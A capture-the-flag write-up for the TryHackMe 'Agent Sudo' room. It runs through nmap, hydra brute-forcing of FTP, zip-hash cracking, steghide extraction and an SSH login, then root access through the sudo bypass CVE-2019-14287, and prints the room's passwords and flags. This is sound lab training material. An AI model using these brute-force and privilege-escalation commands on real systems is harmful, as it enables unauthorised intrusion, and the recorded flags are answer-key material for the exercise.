
---

IP = `10.10.93.163`

![[Pasted image 20241017170330.png]]

NMAP

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

![[Pasted image 20241017170650.png]]

Username Found: `chris`

FTP brute-force

```
# hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.93.163
--SNIP--
[21][ftp] host: 10.10.93.163   login: chris   password: crystal
--SNIP--

```

```
└─# ftp 10.10.93.163
Connected to 10.10.93.163.
220 (vsFTPd 3.0.3)
Name (10.10.93.163:root): chris
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||57420|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> 
```

```
# cat To_agentJ.txt
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C

```

```
┌──(root㉿core)-[/work/ctf/thm/agent-sudo]
└─# binwalk --extract --dd=".*" cutie.png  --run-as=root

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

```
┌──(root㉿core)-[/work/ctf/thm/agent-sudo]
└─# cd _cutie.png.extracted/

┌──(root㉿core)-[/work/ctf/thm/agent-sudo/_cutie.png.extracted]
└─# ls
0  365  365.zlib  8702  8804

┌──(root㉿core)-[/work/ctf/thm/agent-sudo/_cutie.png.extracted]
└─# ls -la
total 356
drwxr-xr-x 1 root root     40 Oct 17 12:08 .
drwxr-xr-x 1 root root    134 Oct 17 12:08 ..
-rw-r--r-- 1 root root  34842 Oct 17 12:08 0
-rw-r--r-- 1 root root 279312 Oct 17 12:08 365
-rw-r--r-- 1 root root  33973 Oct 17 12:08 365.zlib
-rw-r--r-- 1 root root    280 Oct 17 12:08 8702
-rw-r--r-- 1 root root     22 Oct 17 12:08 8804

┌──(root㉿core)-[/work/ctf/thm/agent-sudo/_cutie.png.extracted]
└─# file *
0:        PNG image data, 528 x 528, 8-bit colormap, non-interlaced
365:      data
365.zlib: Zip archive, with extra data prepended
8702:     Zip archive data, at least v5.1 to extract, compression method=AES Encrypted
8804:     Zip archive data (empty)

┌──(root㉿core)-[/work/ctf/thm/agent-sudo/_cutie.png.extracted]
└─# zip2john 8702 > ../hash.txt
Created directory: /root/.john

```

```
┌──(root㉿core)-[/work/ctf/thm/agent-sudo]
└─# cat hash.txt
8702/To_agentR.txt:$zip2$*0*1*0*4673cae714579045*67aa*4e*61c4cf3af94e649f827e5964ce575c5f7a239c48fb992c8ea8cbffe51d03755e0ca861a5a3dcbabfa618784b85075f0ef476c6da8261805bd0a4309db38835ad32613e3dc5d7e87c0f91c0b5e64e*4969f382486cb6767ae6*$/zip2$:To_agentR.txt:8702:8702
```

```
┌──(root㉿core)-[/work/ctf/thm/agent-sudo]
└─# john hash.txt -w /usr/share/wordlists/rockyou.txt
--SNIP--
alien            (8702/To_agentR.txt)
--SNIP--
```

```
┌──(root㉿core)-[/work/ctf/thm/agent-sudo/_cutie.png.extracted]
└─# 7z e 8702.zip

7-Zip 24.08 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-08-11
 64-bit locale=C.UTF-8 Threads:8 OPEN_MAX:4096

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280


Enter password (will not be echoed):
Everything is Ok

Size:       86
Compressed: 280

┌──(root㉿core)-[/work/ctf/thm/agent-sudo/_cutie.png.extracted]
└─# ls
0  365  365.zlib  8702.zip  8804  To_agentR.txt

```

```
┌──(root㉿core)-[/work/ctf/thm/agent-sudo/_cutie.png.extracted]
└─# cat To_agentR.txt
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R

```

```
┌──(root㉿core)-[/work/ctf/thm/agent-sudo/_cutie.png.extracted]
└─# echo "QXJlYTUx" | base64 -d
Area51

```

```

┌──(root㉿core)-[/work/ctf/thm/agent-sudo]
└─# binwalk cute-alien.jpg

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01


┌──(root㉿core)-[/work/ctf/thm/agent-sudo]
└─# steghide extract -sf cute-alien.jpg
Enter passphrase:
wrote extracted data to "message.txt".

┌──(root㉿core)-[/work/ctf/thm/agent-sudo]
└─# ls
To_agentJ.txt  _cutie.png.extracted  cute-alien.jpg  cutie.png  hash.txt  message.txt  nmap  whatweb
```

```
┌──(root㉿core)-[/work/ctf/thm/agent-sudo]
└─# cat message.txt
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris

```

Creds found

`james` : `hackerrules!`

```
┌──(root㉿core)-[/work/ctf/thm/agent-sudo]
└─# ssh james@10.10.93.163
--SNIP--
Last login: Tue Oct 29 14:26:27 2019
james@agent-sudo:~$ whoami
james
james@agent-sudo:~$

```

### Priv Esc

**User.txt**

`b03d975e8c92a7c04146cfa7a5a313c7`


```
james@agent-sudo:~$ sudo -l
[sudo] password for james:
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
james@agent-sudo:~$ 
```

![[Pasted image 20241017180319.png]]

CVE-2019-14287

[Exploit](https://github.com/nu11secur1ty/Linux_hardening_and_security/blob/master/Sudo/README.MD):

`sudo -u#-1 /bin/bash`

```
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# whoami
root
root@agent-sudo:~#
```

```
root@agent-sudo:~# cd /root/
root@agent-sudo:/root# ls
root.txt
root@agent-sudo:/root# cat root.txt
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine.

Your flag is
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
root@agent-sudo:/root#
```

**Root.txt**

`b53a02f55b57d4439e3341834d70c062`